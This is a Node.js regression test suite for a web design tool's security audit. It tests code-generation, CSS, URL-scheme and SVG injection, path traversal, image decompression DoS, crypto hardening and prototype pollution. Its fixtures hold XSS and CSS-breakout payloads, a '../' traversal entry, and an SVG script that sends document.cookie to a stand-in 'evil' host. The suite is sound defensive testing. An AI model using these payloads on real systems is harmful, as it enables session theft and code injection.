#!/usr/bin/env node
// ============================================================
// PallettAI Studio — Security Audit Regression Suite
// Guards the findings fixed in the cross-module security audit:
//
//   1. Generated-code injection   (security-forms, theme-engine)
//   2. CSS injection              (token-exporter, textures, font-kinetic)
//   3. URL scheme injection       (layout-variants)
//   4. Path traversal             (file-integrity)
//   5. Decompression / dimension DoS (color-extractor)
//   6. Crypto misuse              (crypto-vault iteration ceiling, file mode)
//   7. Metadata privacy           (media WebP EXIF/XMP, SVG scripts)
//   8. DOM-injection robustness   (theme-injector)
//   9. Untrusted import hardening (importer)
//
// Every check here corresponds to a real defect that was found and
// fixed; a regression in any of them fails the suite.
// Run: node scripts/security-audit-smoke.js
// ============================================================
'use strict';

var fs = require('fs');
var path = require('path');
var os = require('os');
var crypto = require('crypto');
var zlib = require('zlib');

var SF = require('../modules/security-forms.js');
var TE = require('../modules/token-exporter.js');
var FI = require('../modules/file-integrity.js');
var CE = require('../modules/color-extractor.js');
var CV = require('../modules/crypto-vault.js');
var Media = require('../modules/media.js');
var Textures = require('../modules/textures.js');
var ThemeEngine = require('../modules/theme-engine.js');
var FontKinetic = require('../modules/font-kinetic.js');
var LayoutVariants = require('../modules/layout-variants.js');
var ThemeInjector = require('../modules/theme-injector.js');
var Importer = require('../modules/importer.js');

var TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'pai-sec-'));
var PASS = 0, FAIL = 0, FAILURES = [], CRASH = null;

function ok(cond, label, extra) {
  if (cond) { PASS++; return true; }
  FAIL++; FAILURES.push(label);
  console.error('  x ' + label + (extra ? '   [' + extra + ']' : ''));
  return false;
}
function section(t) { console.log('\n== ' + t + ' =='); }

/* ---------------- helpers ---------------- */

function crc32(buf) {
  var t = crc32.t || (crc32.t = (function () {
    var a = [];
    for (var n = 0; n < 256; n++) { var c = n; for (var k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; a[n] = c >>> 0; }
    return a;
  })());
  var c = 0xffffffff;
  for (var i = 0; i < buf.length; i++) c = t[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}
function pngChunk(type, data) {
  var len = Buffer.alloc(4); len.writeUInt32BE(data.length, 0);
  var td = Buffer.concat([Buffer.from(type, 'ascii'), data]);
  var crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td), 0);
  return Buffer.concat([len, td, crc]);
}
var PNG_SIG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);

function riffChunk(id, payload) {
  var out = Buffer.alloc(8 + payload.length + (payload.length % 2));
  out.write(id, 0, 'ascii');
  out.writeUInt32LE(payload.length, 4);
  Buffer.from(payload).copy(out, 8);
  return out;
}
function webpFile(chunks) {
  var body = Buffer.concat(chunks);
  var head = Buffer.alloc(12);
  head.write('RIFF', 0, 'ascii');
  head.writeUInt32LE(4 + body.length, 4);
  head.write('WEBP', 8, 'ascii');
  return Buffer.concat([head, body]);
}

async function main() {
  /* ============================================================
     1. GENERATED-CODE INJECTION
     ============================================================ */
  section('1. generated-code injection (security-forms, theme-engine)');

  var evilEndpoint = 'https://evil.example.com/*/globalThis.PWNED=1;/*';
  var router = SF.generateProgressiveFormScript(evilEndpoint);
  ok(router.meta.ok, 'hostile endpoint still accepted as a valid https URL');
  var comment = router.script.split('\n').slice(0, 4).join('\n');
  ok(comment.indexOf('PWNED') === -1, 'endpoint URL is not interpolated into the generated comment');
  var codeOnly = router.script.replace(/"(?:[^"\\]|\\.)*"/g, '""');
  ok(codeOnly.indexOf('PWNED') === -1, 'injected payload survives only inside a string literal');
  var routerParses = true;
  try { new Function(router.script); } catch (e) { routerParses = false; }
  ok(routerParses, 'generated form router still parses');
  ok(router.script.indexOf('</script>') === -1, 'generated router contains no raw </script>');

  var vault = await SF.generateClientVaultScript('correct horse battery staple', {
    hint: '</script><script>alert(1)</script>'
  });
  ok(vault.meta.realCrypto === true, 'vault uses the real WebCrypto path');
  ok(vault.meta.iterations >= 210000, 'vault stretches with >=210k PBKDF2 iterations', String(vault.meta.iterations));
  ok(vault.script.indexOf('</script>') === -1, 'vault hint cannot break out of an inline <script>');
  ok(vault.script.indexOf('\\u003c/script\\u003e') !== -1, 'hint escaped as a \\u003c sequence');
  var vaultParses = true;
  try { new Function(vault.script); } catch (e) { vaultParses = false; }
  ok(vaultParses, 'generated vault script parses');

  var toggle = ThemeEngine.generateThemeToggleScript({ storageKey: 'k</script><script>alert(1)' });
  ok(toggle.indexOf('</script>') === -1, 'theme toggle script cannot break out of an inline <script>');
  var toggleParses = true;
  try { new Function(toggle); } catch (e) { toggleParses = false; }
  ok(toggleParses, 'theme toggle script parses');

  /* ============================================================
     2. CSS INJECTION
     ============================================================ */
  section('2. CSS injection (token-exporter, textures, font-kinetic)');

  ok(TE.safeCssValue('#3b82f6') === '#3b82f6', 'plain colour passes the value guard');
  ok(TE.safeCssValue('clamp(2rem, 1.2rem + 2.5vw, 3.5rem)') !== null, 'clamp() passes the value guard');
  ok(TE.safeCssValue('0 1px 2px rgba(15,23,42,.35)') !== null, 'shadow passes the value guard');
  ok(TE.safeCssValue('red; } body { display: none }') === null, 'declaration breakout rejected');
  ok(TE.safeCssValue('red\\7d ) body') === null, 'backslash escape rejected');
  ok(TE.safeCssValue('red\u0000') === null, 'control character rejected');

  var evilTokens = { colors: { primary: 'red; } body { display: none } .x {' } };
  var tw = TE.exportToTailwindV4(evilTokens);
  ok(tw.css.indexOf('display: none') === -1, 'Tailwind @theme cannot be broken out of');
  ok(tw.warnings.some(function (w) { return /dropped/.test(w); }), 'unsafe value reported, not silently dropped');
  var cvars = TE.exportToCSSVariables(evilTokens, 'pai');
  ok(cvars.css.indexOf('display: none') === -1, ':root block cannot be broken out of');
  var goodCss = TE.exportToCSSVariables({ colors: { primary: '#3b82f6' }, shadows: { rest: '0 1px 2px rgba(0,0,0,.2)' } }, 'pai');
  ok(goodCss.css.indexOf('--pai-primary:#3b82f6') !== -1, 'legitimate values still emit');
  ok(goodCss.css.indexOf('--pai-shadow-rest') !== -1, 'legitimate shadows still emit');

  var tex = Textures.generateArchetypeTexture('bento-glass', 'oklch(0.62 0.19 25.6)', {
    bgSize: 'cover} body{display:none}',
    surface: '#fff} body{display:none}'
  });
  ok(tex.ok, 'texture still generates with hostile options');
  ok(tex.css.indexOf('display:none') === -1 && tex.css.indexOf('display: none') === -1, 'texture CSS cannot be broken out of');
  ok(tex.css.indexOf('background-size:auto') !== -1, 'bad background-size falls back to auto');

  var axes = { axes: { wght: { min: 300, max: 700, default: 400 } } };
  var hostileFont = FontKinetic.generateVariableFontCSS('Inter\n} body { display: none } .x {', axes);
  ok(hostileFont.ok, 'variable font CSS still generates for a hostile family name');
  ok(!/[{};"'\\\r\n]/.test(hostileFont.fontFamily), 'family name holds no CSS-structural characters');
  ok(!/;\s*(?:body|\.x)\s*\{/.test(hostileFont.css), 'no injected rule reaches the stylesheet');
  var normalFont = FontKinetic.generateVariableFontCSS('Source Serif Pro', axes);
  ok(normalFont.ok && normalFont.css.indexOf('font-family: "Source Serif Pro"') !== -1, 'legitimate font names unaffected');

  /* ============================================================
     3. URL SCHEME INJECTION
     ============================================================ */
  section('3. URL scheme injection (layout-variants)');

  function heroHtml(href) {
    var r = LayoutVariants.compileSectionVariant('hero', 'A', {
      title: 'Hi', cta: { label: 'Go', href: href }
    }, 'bento-glass');
    return r && r.ok ? r.html : '';
  }
  var jsHref = heroHtml('javascript:alert(1)');
  ok(jsHref.indexOf('javascript:') === -1, 'javascript: CTA href is not emitted');
  var dataHref = heroHtml('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==');
  ok(dataHref.indexOf('data:text/html') === -1, 'data: CTA href is not emitted');
  var safe = heroHtml('https://example.com/offer');
  ok(safe.indexOf('https://example.com/offer') !== -1, 'https CTA href preserved');
  var rel = heroHtml('/pricing');
  ok(rel.indexOf('href="/pricing"') !== -1, 'relative CTA href preserved');
  var anchor = heroHtml('#plans');
  ok(anchor.indexOf('href="#plans"') !== -1, 'fragment CTA href preserved');
  var esc = LayoutVariants.compileSectionVariant('hero', 'A', { title: '<img src=x onerror=alert(1)>' }, 'bento-glass');
  ok(esc.ok && esc.html.indexOf('<img src=x') === -1, 'HTML in content data is escaped');

  /* ============================================================
     4. PATH TRAVERSAL
     ============================================================ */
  section('4. path traversal (file-integrity)');

  var sandbox = fs.mkdtempSync(path.join(TMP, 'sbx-'));
  var dist = path.join(sandbox, 'dist');
  var cache = path.join(sandbox, 'cache');
  fs.mkdirSync(dist, { recursive: true });
  fs.mkdirSync(cache, { recursive: true });
  fs.writeFileSync(path.join(dist, 'index.html'), '<html>ok</html>');
  var key = 'k'.repeat(32);
  var gen = FI.generateBuildManifest(dist, { signingKey: key });
  ok(gen.ok, 'manifest generated');
  var mpath = gen.manifestPath || path.join(dist, FI.MANIFEST_NAME);

  var clean = FI.verifyBuildIntegrity(dist, mpath, { signingKey: key });
  ok(clean.ok, 'clean build verifies');

  // Tampered manifest entry pointing outside the build folder.
  var man = JSON.parse(fs.readFileSync(mpath, 'utf8'));
  man.payload.files['../../escaped-' + Date.now() + '.txt'] = { sha256: 'x'.repeat(64), size: 1, mtimeMs: 1 };
  man.signature = crypto.createHmac('sha256', man.signingKey).update(JSON.stringify(man.payload)).digest('hex');
  fs.writeFileSync(mpath, JSON.stringify(man));
  var traversalVerify = FI.verifyBuildIntegrity(dist, mpath, { signingKey: key });
  var refused = (traversalVerify.issues || []).some(function (i) { return i.status === 'corrupted' && /escapes/.test(i.reason || ''); });
  ok(refused, 'traversal entry refused during verification', JSON.stringify(traversalVerify.summary));

  var escapeRel = '../escaped-' + Date.now() + '.txt';
  var escapeTarget = path.resolve(cache, escapeRel);
  var repair = FI.autoRepairCorruptedFiles([{ file: escapeRel, status: 'corrupted' }], cache, { distFolderPath: dist });
  ok(repair.failed.length === 1 && /escapes/.test(repair.failed[0].reason), 'repair refuses paths outside the roots',
    JSON.stringify(repair.failed));
  ok(!fs.existsSync(escapeTarget), 'nothing was written at the escaped destination');
  ok(repair.repaired.length === 0, 'nothing reported as repaired');

  var truncated = JSON.parse(fs.readFileSync(mpath, 'utf8'));
  truncated.signature = 'abc';
  fs.writeFileSync(mpath, JSON.stringify(truncated));
  var shortSig;
  try {
    shortSig = FI.verifyBuildIntegrity(dist, mpath, { signingKey: key });
    ok(shortSig.ok === false && shortSig.signatureValid === false, 'truncated signature rejected without throwing');
  } catch (e) {
    ok(false, 'truncated signature must not throw', e.message);
  }

  /* ============================================================
     5. DECOMPRESSION / DIMENSION DoS
     ============================================================ */
  section('5. decompression and dimension DoS (color-extractor)');

  var hugeIhdr = Buffer.alloc(13);
  hugeIhdr.writeUInt32BE(100000, 0); hugeIhdr.writeUInt32BE(100000, 4);
  hugeIhdr[8] = 8; hugeIhdr[9] = 6;
  var hugePng = Buffer.concat([PNG_SIG, pngChunk('IHDR', hugeIhdr), pngChunk('IDAT', zlib.deflateSync(Buffer.alloc(64))), pngChunk('IEND', Buffer.alloc(0))]);
  var t0 = Date.now();
  var bigPng = CE.extractImagePalette(hugePng, 5);
  ok(bigPng.ok === false && /too large/i.test(bigPng.error || ''), 'oversized PNG refused before allocation', (Date.now() - t0) + 'ms');

  var hugeBmp = Buffer.alloc(60);
  hugeBmp[0] = 0x42; hugeBmp[1] = 0x4d;
  hugeBmp.writeInt32LE(54, 10); hugeBmp.writeInt32LE(40, 14);
  hugeBmp.writeInt32LE(60000, 18); hugeBmp.writeInt32LE(60000, 22);
  hugeBmp.writeInt16LE(24, 28);
  var bigBmp = CE.extractImagePalette(hugeBmp, 5);
  ok(bigBmp.ok === false && /too large/i.test(bigBmp.error || ''), 'oversized BMP refused before allocation');

  var rows = Buffer.alloc((4 * 4 + 1) * 4);
  for (var y = 0; y < 4; y++) {
    var off = y * (4 * 4 + 1) + 1;
    for (var x = 0; x < 4; x++) { rows[off + x * 4] = 255; rows[off + x * 4 + 3] = 255; }
  }
  var goodIhdr = Buffer.alloc(13);
  goodIhdr.writeUInt32BE(4, 0); goodIhdr.writeUInt32BE(4, 4);
  goodIhdr[8] = 8; goodIhdr[9] = 6;
  var goodPng = Buffer.concat([PNG_SIG, pngChunk('IHDR', goodIhdr), pngChunk('IDAT', zlib.deflateSync(rows)), pngChunk('IEND', Buffer.alloc(0))]);
  ok(CE.extractImagePalette(goodPng, 5).ok === true, 'legitimate PNG still decodes');
  var raw = Buffer.alloc(4 + 16 * 4);
  raw[0] = 4; raw[2] = 4;
  for (var po = 4; po < raw.length; po += 4) { raw[po] = 220; raw[po + 1] = 40; raw[po + 2] = 40; raw[po + 3] = 255; }
  ok(CE.extractImagePalette(raw, 5).ok === true, 'raw RGBA passthrough still decodes');

  /* ============================================================
     6. CRYPTO MISUSE
     ============================================================ */
  section('6. crypto hardening (crypto-vault)');

  var enc = CV.encryptSecret('tok_secret_123', 'passphrase-under-test');
  ok(enc.ok && enc.meta.iterations >= 100000, 'encryption uses the iteration floor');
  var dec = CV.decryptSecret(enc.payload, 'passphrase-under-test');
  ok(dec.ok && dec.secret === 'tok_secret_123', 'round-trip decrypts');
  ok(CV.decryptSecret(enc.payload, 'wrong').ok === false, 'wrong passphrase rejected by GCM auth');

  var bomb = JSON.parse(JSON.stringify(enc.payload));
  bomb.iter = 1e12;
  var tb = Date.now();
  var bombRes = CV.decryptSecret(bomb, 'passphrase-under-test');
  ok(bombRes.ok === false && (Date.now() - tb) < 5000, 'absurd iteration count rejected without hanging', (Date.now() - tb) + 'ms');
  var low = JSON.parse(JSON.stringify(enc.payload));
  low.iter = 1000;
  ok(CV.decryptSecret(low, 'passphrase-under-test').ok === false, 'sub-floor iteration count rejected');
  var flipped = JSON.parse(JSON.stringify(enc.payload));
  var ctBuf = Buffer.from(flipped.ct, 'base64');
  ctBuf[0] = ctBuf[0] ^ 0xff;
  flipped.ct = ctBuf.toString('base64');
  ok(CV.decryptSecret(flipped, 'passphrase-under-test').ok === false, 'flipped ciphertext bit fails auth');

  var vdir = fs.mkdtempSync(path.join(TMP, 'vault-'));
  var vp = path.join(vdir, 'secrets.vault.json');
  var wrote = CV.writeVault(vp, { netlify: 'nfp_abc', cloudflare: 'cf_xyz' }, 'vault-passphrase');
  ok(wrote.ok && wrote.count === 2, 'vault written atomically');
  ok((fs.statSync(vp).mode & 0o777) === 0o600, 'vault file is owner-only (0600)');
  var plaintext = fs.readFileSync(vp, 'utf8');
  ok(plaintext.indexOf('nfp_abc') === -1 && plaintext.indexOf('cf_xyz') === -1, 'vault holds no plaintext secrets');
  ok(CV.readVault(vp, 'vault-passphrase').secrets.netlify === 'nfp_abc', 'vault reads back');
  ok(fs.readdirSync(vdir).every(function (f) { return !/\.tmp-/.test(f); }), 'no temp files left behind');

  /* ============================================================
     7. METADATA PRIVACY
     ============================================================ */
  section('7. metadata privacy (media)');

  var webp = webpFile([
    riffChunk('VP8 ', Buffer.alloc(64, 7)),
    riffChunk('EXIF', Buffer.from('GPS: 51.5074N 0.1278W')),
    riffChunk('XMP ', Buffer.from('<x:xmpmeta>gps</x:xmpmeta>')),
    riffChunk('ICCP', Buffer.from('colour-profile'))
  ]);
  var webpOut = await Media.optimizeLocalImage(new Uint8Array(webp), { widths: [64] });
  ok(webpOut && webpOut.ok, 'WebP processes');
  var webpRemoved = webpOut.stripped || [];
  ok(Array.isArray(webpRemoved) && webpRemoved.some(function (r) { return /EXIF/.test(String(r)); }), 'WebP EXIF chunk removed');
  ok(webpRemoved.some(function (r) { return /XMP/.test(String(r)); }), 'WebP XMP chunk removed');
  var webpBytes = webpOut.bytes;
  if (webpBytes) {
    var webpTxt = Buffer.from(webpBytes).toString('latin1');
    ok(webpTxt.indexOf('51.5074N') === -1, 'GPS payload actually removed from the bytes');
    ok(webpTxt.indexOf('colour-profile') !== -1, 'ICC colour profile preserved');
    ok(webpTxt.indexOf('VP8 ') !== -1, 'image data preserved');
    var declared = webpBytes[4] | (webpBytes[5] << 8) | (webpBytes[6] << 16) | (webpBytes[7] << 24);
    ok(declared === webpBytes.length - 8, 'RIFF size field corrected after chunk removal');
  }

  var evilSvg = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
    '<script>fetch("//evil/"+document.cookie)</script><rect width="10" height="10"/>' +
    '<foreignObject><img src=x onerror=alert(2)></foreignObject>' +
    '<a href="javascript:alert(3)">x</a></svg>';
  var svgOut = await Media.optimizeLocalImage(new Uint8Array(Buffer.from(evilSvg)), { widths: [64] });
  ok(svgOut && svgOut.ok, 'SVG processes');
  ok((svgOut.removedSegments || 0) >= 1, 'SVG sanitization reported');
  var svgTxt = Buffer.from(svgOut.bytes || Buffer.alloc(0)).toString('utf8');
  ok(svgTxt.indexOf('<script') === -1, 'SVG <script> stripped');
  ok(!/onload\s*=/.test(svgTxt), 'SVG onload handler stripped');
  ok(!/onerror/.test(svgTxt), 'nested onerror handler stripped');
  ok(svgTxt.indexOf('javascript:') === -1, 'SVG javascript: URL stripped');
  ok(svgTxt.indexOf('<rect') !== -1, 'legitimate SVG content preserved');
  var cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg"><rect width="8" height="8" fill="#f00"/></svg>';
  var cleanOut = await Media.optimizeLocalImage(new Uint8Array(Buffer.from(cleanSvg)), { widths: [64] });
  ok(((cleanOut && cleanOut.removedSegments) || 0) === 0, 'clean SVG is not modified');

  /* ============================================================
     8. DOM INJECTION ROBUSTNESS
     ============================================================ */
  section('8. DOM injection robustness (theme-injector)');

  function stubDoc(strict) {
    var props = {};
    return {
      props: props,
      documentElement: {
        style: {
          setProperty: function (n, v) {
            if (strict && !/^--[a-z0-9_-]+$/i.test(n)) throw new Error('SyntaxError: invalid property name');
            props[n] = v;
          },
          removeProperty: function (n) { delete props[n]; },
          getPropertyValue: function (n) { return props[n] || ''; },
          set cssText(v) { this._t = v; }, get cssText() { return this._t || ''; }
        },
        classList: { add: function () {}, remove: function () {}, contains: function () { return false; } },
        setAttribute: function () {}, removeAttribute: function () {},
        getAttribute: function () { return null; }, appendChild: function () {}, querySelector: function () { return null; }
      },
      head: { appendChild: function () {} },
      body: { classList: { add: function () {}, remove: function () {} } },
      createElement: function () { return { textContent: '', setAttribute: function () {}, appendChild: function () {} }; },
      querySelector: function () { return null; },
      addEventListener: function () {}
    };
  }

  var doc = stubDoc(true);
  var inj;
  try {
    inj = ThemeInjector.injectThemeTokens(doc, { '--bad name;{}': '#fff', '--pai-good': '#000' });
  } catch (e) {
    ok(false, 'injection must not throw on a malformed property name', e.message);
  }
  if (inj) {
    ok(inj.ok === true, 'injection completes despite a malformed name');
    ok(inj.skipped.indexOf('--bad name;{}') !== -1, 'raw malformed property skipped', JSON.stringify(inj.skipped));
    ok(doc.props['--pai-good'] === '#000', 'valid property still applied');
    ok(Object.keys(doc.props).every(function (k) { return /^--[a-z0-9_-]+$/i.test(k); }), 'only valid custom properties reach the DOM');
  }
  var doc2 = stubDoc(true);
  var inj2 = ThemeInjector.injectThemeTokens(doc2, {
    colors: { primary: '#3b82f6', 'bad name;{}': '#fff' },
    shadows: { rest: '0 1px 2px rgba(0,0,0,.2)' }
  });
  ok(inj2 && inj2.ok === true, 'structured token map injects cleanly');
  ok(Object.keys(doc2.props).every(function (k) { return /^--[a-z0-9_-]+$/i.test(k); }), 'flattened names are normalised to valid properties');

  /* ============================================================
     9. UNTRUSTED IMPORT
     ============================================================ */
  section('9. untrusted import hardening (importer)');

  var hostileImports = [
    'not json at all', '', 'null', '[]',
    '{"kind":"pallettai.project","project":{"site":{"pages":[]},"__proto__":{"polluted":"yes"}}}',
    '{"kind":"pallettai.project","project":{"site":"nope","pages":42}}',
    '{"kind":"pallettai.project","project":{"site":{"sections":[{"id":"s1","type":"hero","cta":{"href":"javascript:alert(1)"}}]}}}'
  ];
  hostileImports.forEach(function (text, i) {
    var r;
    try { r = Importer.parseProjectFile(text); } catch (e) { ok(false, 'import #' + i + ' must not throw', e.message); return; }
    ok(r && typeof r.ok === 'boolean', 'import #' + i + ' returns a structured result');
  });
  ok(({}).polluted === undefined, 'no global prototype pollution from hostile imports');

  // Contract: markup inside content fields is imported as PLAIN TEXT and
  // flagged, never treated as live markup. (The renderer escapes every
  // text field with esc(...) — builder.js — so the contract holds end to
  // end; here we assert the importer's half: a warning, not silence.)
  var fromHtml = Importer.parseProjectFile(JSON.stringify({
    kind: 'pallettai.project',
    project: {
      site: { sections: [{ id: 's1', type: 'hero', title: '<script>alert(1)</script>' }] },
      name: '<img src=x onerror=alert(1)>'
    }
  }));
  ok(fromHtml.ok === false || (fromHtml.warnings || []).some(function (w) { return /markup/i.test(w); }),
    'markup in imported content is flagged as plain text',
    JSON.stringify((fromHtml.warnings || []).slice(0, 2)));
  if (fromHtml.ok) {
    var importedTitle = fromHtml.project && fromHtml.project.site && fromHtml.project.site.sections &&
      fromHtml.project.site.sections[0] && fromHtml.project.site.sections[0].title;
    ok(typeof importedTitle === 'string', 'markup-bearing title is carried as a plain string, not parsed');
    var nameLen = String((fromHtml.project.site && fromHtml.project.site.name) || '').length;
    ok(nameLen <= 200, 'site name is length-clamped on import', String(nameLen));
  }

  /* ============================================================
     10. GRADER → STUDIO CONVERTER

     The converter is the grader site's deliverable: it writes the
     payload Studio imports, so it is audited like any other
     generator. Its SVG placeholders put caller-supplied numbers in
     attribute position, so dimensions are checked hardest.
     ============================================================ */
  section('10. grader converter (grader/converter.js)');

  var GraderConverter;
  try {
    GraderConverter = require(path.join(__dirname, '..', '..', 'pallettai-website', 'grader', 'converter.js'));
  } catch (e) {
    ok(false, 'grader/converter.js loads', e.message);
  }

  if (GraderConverter) {
    function svgOf(ph) {
      return Buffer.from(String(ph.url).split(',')[1] || '', 'base64').toString('utf8');
    }

    // Dimensions land in attribute position: hostile or nonsense values
    // must be coerced, never interpolated (attribute injection / NaN).
    var dimCases = [
      ['1280" onload="alert(1)', NaN], [0, -5], [1e9, '9'.repeat(20)],
      [null, undefined], [{}, []], ['640', '480']
    ];
    var dimsClean = true, dimDetail = '';
    dimCases.forEach(function (pair) {
      var ph = GraderConverter.imagePlaceholder(pair[0], pair[1], 'label', '#fff');
      var head = svgOf(ph).slice(0, svgOf(ph).indexOf('><rect'));
      var valid = ph.w > 0 && ph.w <= 4096 && ph.h > 0 && ph.h <= 4096;
      if (/onload|NaN|undefined|Infinity/.test(head) || !valid) {
        dimsClean = false;
        dimDetail = JSON.stringify(pair.map(String)) + ' → ' + head;
      }
    });
    ok(dimsClean, 'hostile image dimensions are coerced to safe integers', dimDetail);
    ok(GraderConverter.imagePlaceholder(640, 480, 'x', '#fff').w === 640, 'valid dimensions are preserved');

    // The SVG body is live markup: neither label nor colour may break out.
    var escSvg = svgOf(GraderConverter.imagePlaceholder(640, 480, '</text><script>alert(1)</script>', '#fff'));
    ok(escSvg.indexOf('<script>') === -1 && escSvg.indexOf('</text>') !== -1,
      'placeholder label cannot break out of the <text> node');
    var colSvg = svgOf(GraderConverter.imagePlaceholder(640, 480, 'x', '#fff" onload="alert(1)'));
    ok(colSvg.indexOf('onload') === -1, 'malformed colour falls back instead of injecting');

    // Palette: every built-in look must clear AA 4.5 on both text pairs.
    function lumOf(hex) {
      var h = String(hex).replace('#', '');
      var ch = [0, 2, 4].map(function (i) {
        var s = parseInt(h.substr(i, 2), 16) / 255;
        return s <= 0.03928 ? s / 12.92 : Math.pow((s + 0.055) / 1.055, 2.4);
      });
      return 0.2126 * ch[0] + 0.7152 * ch[1] + 0.0722 * ch[2];
    }
    function ratioOf(a, b) {
      var la = lumOf(a), lb = lumOf(b);
      return (Math.max(la, lb) + 0.05) / (Math.min(la, lb) + 0.05);
    }
    var weak = Object.keys(GraderConverter.LOOK_TOKENS).filter(function (k) {
      var t = GraderConverter.LOOK_TOKENS[k];
      return ratioOf(t.text, t.surface) < 4.5 || ratioOf(t.surface, t.primary) < 4.5;
    });
    ok(weak.length === 0, 'every built-in look ships AA-clean text pairs', weak.join(','));

    // The fix log must report a REAL before → after. Regression: the
    // "before" value was read after the palette entry was overwritten,
    // so a repaired colour was logged as unchanged (#x → #x).
    var realLook = GraderConverter.LOOK_TOKENS.warm;
    var forced = null;
    try {
      GraderConverter.LOOK_TOKENS.warm = { primary: '#ffe066', surface: '#fffdf0', text: '#f0ead6', accent: '#ffe066', radius: 20, spacing: 100, font: 'serif' };
      forced = GraderConverter.exportGraderToProject({ url: 'https://joesbakery.com', score: 38, band: 'poor', facts: {}, checks: [] });
    } finally {
      GraderConverter.LOOK_TOKENS.warm = realLook;
    }
    var contrastFixes = forced.grader.autofixes.filter(function (f) { return f.id === 'wcag-contrast'; });
    ok(contrastFixes.length > 0, 'a failing pair produces a contrast autofix', contrastFixes.length);
    var honest = contrastFixes.every(function (f) {
      var m = /\(#([0-9a-f]{6}) → #([0-9a-f]{6})\)/.exec(f.detail);
      return !!m && m[1] !== m[2];
    });
    ok(honest, 'autofix detail reports a real before → after',
      JSON.stringify(contrastFixes.map(function (f) { return f.detail; })));
    ok(ratioOf(forced.project.site.palette.text, forced.project.site.palette.surface) >= 4.5 &&
      ratioOf(forced.project.site.palette.surface, forced.project.site.palette.primary) >= 4.5,
      'repaired palette clears AA 4.5 on both pairs');
    ok(GraderConverter.LOOK_TOKENS.warm === realLook, 'look table is restored after the probe');

    // Gallery placeholders keep distinct per-item titles (regression:
    // url.slice(0, 0) collapsed all three to the same fallback label).
    var payload = GraderConverter.exportGraderToProject({
      url: 'https://joesbakery.com', score: 38, band: 'poor', facts: {}, checks: []
    });
    var gallery = payload.project.site.sections.filter(function (s) { return s.type === 'gallery'; })[0];
    ok(gallery && gallery.items.length === 3 && gallery.items.every(function (it, i) {
      return it.title === 'Work ' + (i + 1);
    }), 'gallery placeholders keep distinct titles',
      gallery ? JSON.stringify(gallery.items.map(function (i) { return i.title; })) : 'no gallery');

    // And the payload still round-trips into the Studio importer.
    ok(Importer.parseProjectFile(JSON.stringify(payload)).ok, 'converter payload imports clean into Studio');
  }
}

main().then(function () {
  console.log('\n========================================');
  console.log('PASSED: ' + PASS + '   FAILED: ' + FAIL);
  if (FAIL) console.log('failed checks:\n - ' + FAILURES.join('\n - '));
  console.log('========================================');
  try { fs.rmSync(TMP, { recursive: true, force: true }); } catch (e) { /* best effort */ }
  process.exit(FAIL ? 1 : 0);
}).catch(function (e) {
  CRASH = e;
  console.error('\nCRASHED: ' + (e && e.message) + '\n' + (e && e.stack));
  try { fs.rmSync(TMP, { recursive: true, force: true }); } catch (e2) { /* best effort */ }
  process.exit(1);
});
